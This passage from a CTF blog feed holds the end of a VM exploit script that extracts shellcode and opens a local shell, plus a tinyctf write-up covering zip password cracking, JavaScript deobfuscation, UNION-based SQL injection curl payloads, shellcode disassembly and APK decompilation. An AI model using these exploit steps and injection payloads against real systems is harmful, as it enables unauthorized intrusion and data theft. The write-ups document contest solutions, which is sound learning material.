    SPLOIT_START_HEX=$(xxd core|grep 'def0.5bab'|awk '{print $1}' |tr -d ':')
    SPLOIT_START=$(printf &quot;%d&quot; 0x$SPLOIT_START_HEX)
    echo &quot;[+] found encrypted shellcode at offset $SPLOIT_START&quot;
    echo &quot;[+] extracting... $SPLOIT_LEN&quot;
    dd if=core of=./tfc-sploit.tfc bs=1 skip=$SPLOIT_START count=$SPLOIT_LEN &amp;&gt;/dev/null
    if [ -f tfc-sploit.tfc ]; then
        echo &quot;[+] running exploit. catch the shell at localhost:64533&quot;
        ./tfc ./tfc-sploit.tfc derp.tfc &amp;
    fi
else
    echo &quot;[!] core not found!&quot;
    exit 1
fi

echo &quot;[+] cleaning up. all done!&quot;
rm ./pwn &amp;&gt;/dev/null
rm ./tfc-sploit.tfc &amp;&gt;/dev/null
rm ./in.tfc &amp;&gt;/dev/null
exit 0</code></pre></noscript></div>


<p>I will leave a ROP exploit &lsquo;as an exercise to the reader&rsquo; :) knock-knock was a fun VM and so thanks to zer0w1re and c0ne!</p>

<p>Updated <code>enc.py</code>, contained another error but should be fixed now:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>


<span class="k">def</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="n">infile</span><span class="p">,</span> <span class="n">outfile</span><span class="p">):</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">infile</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span> 
    
    <span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span> <span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">block</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">)</span> <span class="p">)</span>
        
        <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
            <span class="n">temp_xor_key</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">):</span>
                <span class="n">temp_xor_key</span> <span class="o">^=</span> <span class="mh">0x6daa1cf4</span>
            <span class="n">xor_key</span> <span class="o">=</span> <span class="n">temp_xor_key</span>
        
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">outfile</span><span class="p">,</span> <span class="s">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
            <span class="n">f</span><span class="o">.</span><span class="n">close</span>
            
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">&#39;usage: {} &lt;infile&gt; &lt;outfile&gt;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="n">xcrypt</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span></code></pre></div>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Tinyctf Writeup]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/03/tinyctf/"/>
    <updated>2014-10-03T19:25:41+02:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/03/tinyctf</id>
    <content type="html"><![CDATA[<p><code>tinyctf</code> was ran by @balidani and was actually a very enjoyable Jeopardy-style CTF event! I spent quite some time on the challenges and got all flags except crypto200. I kept some notes in <code>keepnote</code> which I converted to this blog post. The name of each challenge was a hint for solving the challenge. The author hinted at a VM containing all the challenges, so keep you eyes peeled for that one.</p>

<!--more-->


<h1>misc50</h1>

<p>Clearly, this was <code>brainfuck</code> code! Yay for <code>brainfuck</code>! Unfortunately, this being a CTF, I quickly entered the bf code in an online interpreter, got the flag and did not keep any notes. But yay for <code>bf</code>!</p>

<h1>misc100 aka Janos the Ripper</h1>

<p>The zip file contained a second zip file with a password-protected file called &lsquo;flag&rsquo;. The name of course hinted strongly in the direction of John the Ripper and indeed, JtR made quick work of this password-protected zip file:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tools/john-1.7.9-jumbo-7/run<span class="nv">$ </span>./zip2john ~/tmp/misc100 &gt; misc100.hashes
/home/bas/tmp/misc100-&gt;flag.txt PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>39, <span class="nv">decmplen</span><span class="o">=</span>25, <span class="nv">crc</span><span class="o">=</span>7788D444
bas@tritonal:~/tools/john-1.7.9-jumbo-7/run<span class="nv">$ </span>./john ./misc100.hashes 
Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64<span class="o">])</span>
fish             <span class="o">(</span>/home/bas/tmp/misc100<span class="o">)</span>
guesses: <span class="m">1</span>  <span class="nb">time</span>: 0:00:00:00 DONE <span class="o">(</span>Mon Sep <span class="m">29</span> 22:14:44 2014<span class="o">)</span>  c/s: <span class="m">388328</span>  trying: marisol - <span class="nb">help</span>
Use the <span class="s2">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</code></pre></div>


<p><code>flag{ev3n::y0u::bru7us?!}</code></p>

<h1>web100</h1>

<p>This challenge presents us again with a file to download, which turns out to be a heavily obfuscated <code>javascript</code> file. Between the javascript statements are strange bytes values, such as <code>0x02</code> or <code>0x01</code>. These are not visible in the code below.</p>

<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script&gt;</span><span class="nx">_</span><span class="o">=</span><span class="s1">&#39;function $(){e=getEleById(&quot;c&quot;).value;length==16^be0f23233ace98aa$c7be9){tfls_aie}na_h0lnrg{e_0iit\&#39;_ns=[t,n,r,i];for(o=0;o&lt;13;++o){  [0]);.splice(0,1)}}}    \&#39;&lt;input id=&quot;c&quot;&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\&#39;);delete _var &quot;,&quot;docu.)match(/&quot;];/)!=null=[&quot;   write(s[o%4]buttonif(e.ment&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nx">Y</span> <span class="k">in</span> <span class="nx">$</span><span class="o">=</span><span class="s1">&#39;    &#39;</span><span class="p">)</span><span class="kd">with</span><span class="p">(</span><span class="nx">_</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="nx">$</span><span class="p">[</span><span class="nx">Y</span><span class="p">]))</span><span class="nx">_</span><span class="o">=</span><span class="nx">join</span><span class="p">(</span><span class="nx">pop</span><span class="p">());</span><span class="nb">eval</span><span class="p">(</span><span class="nx">_</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span></code></pre></div>


<p>I had little luck trying to reverse this javascript. I noticed that the entire string is parsed with <code>eval</code> so I just replaced it with <code>alert</code> and ran the javascript. I was presented with the following code, after pulling it through <a href="http://jsbeautifier.org/">jsbeautifier.org</a>:</p>

<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">$</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;c&quot;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">16</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^be0f23/</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/233ac/</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/e98aa$/</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/c7be9/</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
                        <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;fl&quot;</span><span class="p">,</span> <span class="s2">&quot;s_a&quot;</span><span class="p">,</span> <span class="s2">&quot;i&quot;</span><span class="p">,</span> <span class="s2">&quot;e}&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;_h0l&quot;</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;g{&quot;</span><span class="p">,</span> <span class="s2">&quot;e&quot;</span><span class="p">,</span> <span class="s2">&quot;_0&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;it&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;_&quot;</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="p">[</span><span class="nx">t</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">r</span><span class="p">,</span> <span class="nx">i</span><span class="p">];</span>
                        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">o</span> <span class="o">&lt;</span> <span class="mi">13</span><span class="p">;</span> <span class="o">++</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">s</span><span class="p">[</span><span class="nx">o</span> <span class="o">%</span> <span class="mi">4</span><span class="p">][</span><span class="mi">0</span><span class="p">]);</span>
                            <span class="nx">s</span><span class="p">[</span><span class="nx">o</span> <span class="o">%</span> <span class="mi">4</span><span class="p">].</span><span class="nx">splice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
<span class="p">}</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#39;</span><span class="p">);</span>
<span class="k">delete</span> <span class="nx">_</span></code></pre></div>


<p>So the original javascript replaces all the weird bytes and then runs this code, which obviously checks the input. If it is valid, it will unmangle the flag. I was not able to get the proper string, but who cares when I can just run:</p>

<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script&gt;</span><span class="kd">function</span> <span class="nx">$</span><span class="p">()</span> <span class="p">{</span>
                        <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;fl&quot;</span><span class="p">,</span> <span class="s2">&quot;s_a&quot;</span><span class="p">,</span> <span class="s2">&quot;i&quot;</span><span class="p">,</span> <span class="s2">&quot;e}&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;_h0l&quot;</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;g{&quot;</span><span class="p">,</span> <span class="s2">&quot;e&quot;</span><span class="p">,</span> <span class="s2">&quot;_0&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;it&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;_&quot;</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span><span class="p">];</span>
                        <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="p">[</span><span class="nx">t</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">r</span><span class="p">,</span> <span class="nx">i</span><span class="p">];</span>
                        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">o</span> <span class="o">&lt;</span> <span class="mi">13</span><span class="p">;</span> <span class="o">++</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">s</span><span class="p">[</span><span class="nx">o</span> <span class="o">%</span> <span class="mi">4</span><span class="p">][</span><span class="mi">0</span><span class="p">]);</span>
                            <span class="nx">s</span><span class="p">[</span><span class="nx">o</span> <span class="o">%</span> <span class="mi">4</span><span class="p">].</span><span class="nx">splice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
                        <span class="p">}</span>
<span class="p">}</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#39;</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span></code></pre></div>


<p><code>flag{it's_a_h0le_in_0ne}</code></p>

<h1>web200</h1>

<p>This was a fun one. We&rsquo;re presented with a webpage about rollercoasters and a search box. We can search for values in the name, park or country. This smells like SQLi. I tried a couple of things in the search box, but this got me nowhere. I viewed the source of the webpage and lo-and-behold: it looks like we can specify the column name to be searched ourselves! I switched over to <code>curl</code> to check this. After a bit of fumbling around for the proper syntax, I came up with this:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>curl -v <span class="s2">&quot;http://54.69.118.120:8000/index.php&quot;</span> --data <span class="s2">&quot;value=999&amp;column=height &lt; 0 union select 1,2,3,4 -- #&quot;</span>
* About to connect<span class="o">()</span> to 54.69.118.120 port <span class="m">8000</span> <span class="o">(</span><span class="c">#0)</span>
*   Trying 54.69.118.120...
* connected
...snip...
        &lt;div <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;content&quot;</span> <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;whitebox&quot;</span>&gt;
            &lt;table&gt;
                &lt;tr&gt;
                    &lt;th&gt;
                        Name
                    &lt;/th&gt;
                    &lt;th&gt;
                        Park
                    &lt;/th&gt;
                    &lt;th&gt;
                        Country
                    &lt;/th&gt;
                    &lt;th&gt;
                        Height
                    &lt;/th&gt;
                    
                &lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;4 m&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
...snip...</code></pre></div>


<p>You can see that the webpage nicely returns the values 1, 2, 3 and 4, verifying a SQL injection. Next, I assumed MySQL and grabbed the table names:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>curl -v <span class="s2">&quot;http://54.69.118.120:8000/index.php&quot;</span> --data <span class="s2">&quot;value=999&amp;column=height &lt; 0 union select 1,2,table_name,0 from information_schema.tables -- #&quot;</span>
...snip...
&lt;td&gt;setup_timers&lt;/td&gt;&lt;td&gt;0 m&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;threads&lt;/td&gt;&lt;td&gt;0 m&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;flag&lt;/td&gt;&lt;td&gt;0 m&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;rollercoaster&lt;/td&gt;&lt;td&gt;0 m&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
...snip...</code></pre></div>


<p>Looks like there is a table named <code>flag</code>! Let&rsquo;s grab column names:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>curl -v <span class="s2">&quot;http://54.69.118.120:8000/index.php&quot;</span> --data <span class="s2">&quot;value=999&amp;column=height &lt; 0 union select 1,2,column_name,0 from information_schema.columns where table_name = &#39;flag&#39; -- #&quot;</span></code></pre></div>


<p>This returned the column <code>hash</code>. Get the flag!</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>curl -v <span class="s2">&quot;http://54.69.118.120:8000/index.php&quot;</span> --data <span class="s2">&quot;value=999&amp;column=height &lt; 0 union select 1,2,hash,0 from flag -- #&quot;</span></code></pre></div>


<p><code>flag{unroll_those_loops}</code></p>

<h1>rev100</h1>

<p>Unpacking the zip file gave me a file that looked like the output of <code>xxd</code>:</p>

<div class="highlight"><pre><code class="language-diff" data-lang="diff">00400080  68 66 6C 00 00 48 BF 01  00 00 00 00 00 00 00 48
00400090  8D 34 24 48 BA 02 00 00  00 00 00 00 00 48 B8 01
004000A0  00 00 00 00 00 00 00 0F  05 68 61 67 00 00 48 BF
004000B0  01 00 00 00 00 00 00 00  48 8D 34 24 48 BA 02 00
004000C0  00 00 00 00 00 00 48 B8  01 00 00 00 00 00 00 00
004000D0  0F 05 68 7B 70 00 00 48  BF 01 00 00 00 00 00 00
004000E0  00 48 8D 34 24 48 BA 02  00 00 00 00 00 00 00 48
004000F0  B8 01 00 00 00 00 00 00  00 0F 05 68 6F 70 00 00
00400100  48 BF 01 00 00 00 00 00  00 00 48 8D 34 24 48 BA
00400110  02 00 00 00 00 00 00 00  48 B8 01 00 00 00 00 00
00400120  00 00 0F 05 68 70 6F 00  00 48 BF 01 00 00 00 00
00400130  00 00 00 48 8D 34 24 48  BA 02 00 00 00 00 00 00
00400140  00 48 B8 01 00 00 00 00  00 00 00 0F 05 68 70 72
00400150  00 00 48 BF 01 00 00 00  00 00 00 00 48 8D 34 24
00400160  48 BA 02 00 00 00 00 00  00 00 48 B8 01 00 00 00
00400170  00 00 00 00 0F 05 68 65  74 00 00 48 BF 01 00 00
00400180  00 00 00 00 00 48 8D 34  24 48 BA 02 00 00 00 00
00400190  00 00 00 48 B8 01 00 00  00 00 00 00 00 0F 05 68
004001A0  7D 0A 00 00 48 BF 01 00  00 00 00 00 00 00 48 8D
004001B0  34 24 48 BA 02 00 00 00  00 00 00 00 48 B8 01 00
004001C0  00 00 00 00 00 00 0F 05  48 31 FF 48 B8 3C 00 00
004001D0  00 00 00 00 00 0F 05</code></pre></div>


<p>Reversing the process with <code>xxd -r</code> gave me a 4 MB file which didn&rsquo;t really help much. Instead, looking at the address and bytes, I somehow got the feeling this was assembly code. So I extracted all the bytes with some quick &amp; dirty bash-fu (&lsquo;cause ctf):</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">cat rev100 <span class="p">|</span>awk <span class="s1">&#39;{print $2$3$4$5$6$7$8$9$10$11$12$13$14$15$16$17}&#39;</span> <span class="p">|</span> tr -d <span class="s1">&#39;\r\n&#39;</span>
68666C000048BF0100000000000000488D342448BA020000000000000048B80...snip...</code></pre></div>


<p>Now <code>radare2</code> comes to the rescue again! Notice the <code>-b 64</code> flag to specify x64 code.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>rasm2 -b <span class="m">64</span> -d <span class="s2">&quot;68666C000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05686167000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05687B70000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05686F70000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F0568706F000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05687072000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05686574000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05687D0A000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F054831FF48B83C000000000000000F05&quot;</span>
push dword 0x6c66
mov rdi, 0x1
lea rsi, <span class="o">[</span>rsp<span class="o">]</span>
mov rdx, 0x2
mov rax, 0x1
syscall
push dword 0x6761
mov rdi, 0x1
lea rsi, <span class="o">[</span>rsp<span class="o">]</span>
mov rdx, 0x2
mov rax, 0x1
syscall
..snip...
push dword 0xa7d
mov rdi, 0x1
lea rsi, <span class="o">[</span>rsp<span class="o">]</span>
mov rdx, 0x2
mov rax, 0x1
syscall
xor rdi, rdi
mov rax, 0x3c
syscall</code></pre></div>


<p>Looks like it wants to use syscall to print characters to the screen. Instead, I extract the values:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>rasm2 -b <span class="m">64</span> -d <span class="s2">&quot;68666C000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05686167000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05687B70000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05686F70000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F0568706F000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05687072000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05686574000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05687D0A000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F054831FF48B83C000000000000000F05&quot;</span> <span class="p">|</span> grep <span class="s2">&quot;push dword&quot;</span> <span class="p">|</span>awk <span class="s1">&#39;{print $3}&#39;</span>
0x6c66
0x6761
0x707b
0x706f
0x6f70
0x7270
0x7465
0xa7d</code></pre></div>


<p><code>xxd -p -r</code> helps to read these bytes.</p>

<p><code>flag{poppopret}</code></p>

<h1>rev200</h1>

<p>This was an annoying challenge. I sort of knew what to do, but couldn&rsquo;t get the proper tools running. The zip file seems to contain an APK file. I tried to run it in an emulator, but did not succeed. I tried four different disassembler and struck gold with <a href="http://code.google.com/p/android-apktool">android-apktool</a>. This tool could disassemble the APK file:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">java -jar apktool.jar -d ./rev200.apk</code></pre></div>


<p>Grepping the files for &lsquo;flag&rsquo; only returned a string id starting with &ldquo;0x7f0..&rdquo; but this was of no use. I started looking at each file, but one stuck out:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/apktool1.5.2/rev200/smali/ctf/crackme<span class="nv">$ </span>cat FlagActivity.smali</code></pre></div>




<div class="highlight"><pre><code class="language-java" data-lang="java"><span class="o">.</span><span class="na">class</span> <span class="kd">public</span> <span class="n">Lctf</span><span class="o">/</span><span class="n">crackme</span><span class="o">/</span><span class="n">FlagActivity</span><span class="o">;</span>
<span class="o">.</span><span class="na">super</span> <span class="n">Landroid</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">Activity</span><span class="o">;</span>
<span class="o">.</span><span class="na">source</span> <span class="s">&quot;FlagActivity.java&quot;</span>


<span class="o">...</span><span class="na">snip</span><span class="o">...</span>

    <span class="o">.</span><span class="na">line</span> <span class="mi">20</span>
    <span class="o">.</span><span class="na">end</span> <span class="n">local</span> <span class="n">v2</span>           <span class="err">#</span><span class="nl">flagText:</span><span class="n">Landroid</span><span class="o">/</span><span class="n">widget</span><span class="o">/</span><span class="n">TextView</span><span class="o">;</span>
    <span class="o">:</span><span class="n">cond_0</span>
    <span class="n">aget</span> <span class="n">v4</span><span class="o">,</span> <span class="n">v0</span><span class="o">,</span> <span class="n">v3</span>

    <span class="kt">int</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="kt">char</span> <span class="n">v4</span><span class="o">,</span> <span class="n">v4</span>

    <span class="n">invoke</span><span class="o">-</span><span class="kd">static</span> <span class="o">{</span><span class="n">v4</span><span class="o">},</span> <span class="n">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">String</span><span class="o">;-&gt;</span><span class="n">valueOf</span><span class="o">(</span><span class="n">C</span><span class="o">)</span><span class="n">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">String</span><span class="o">;</span>

    <span class="n">move</span><span class="o">-</span><span class="n">result</span><span class="o">-</span><span class="n">object</span> <span class="n">v4</span>

    <span class="n">invoke</span><span class="o">-</span><span class="n">virtual</span> <span class="o">{</span><span class="n">v1</span><span class="o">,</span> <span class="n">v4</span><span class="o">},</span> <span class="n">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">String</span><span class="o">;-&gt;</span><span class="n">concat</span><span class="o">(</span><span class="n">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">String</span><span class="o">;)</span><span class="n">Ljava</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">String</span><span class="o">;</span>

    <span class="n">move</span><span class="o">-</span><span class="n">result</span><span class="o">-</span><span class="n">object</span> <span class="n">v1</span>

    <span class="o">.</span><span class="na">line</span> <span class="mi">19</span>
    <span class="n">add</span><span class="o">-</span><span class="kt">int</span><span class="o">/</span><span class="n">lit8</span> <span class="n">v3</span><span class="o">,</span> <span class="n">v3</span><span class="o">,</span> <span class="mh">0x1</span>

    <span class="k">goto</span> <span class="o">:</span><span class="n">goto_0</span>

    <span class="o">.</span><span class="na">line</span> <span class="mi">17</span>
    <span class="n">nop</span>

    <span class="o">:</span><span class="n">array_0</span>
    <span class="o">.</span><span class="na">array</span><span class="o">-</span><span class="n">data</span> <span class="mh">0x4</span> 
        <span class="mh">0x66</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x6c</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x61</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x67</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x7b</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x77</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x34</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x6e</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x6e</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
        <span class="mh">0x34</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> <span class="mh">0x0</span><span class="n">t</span> 
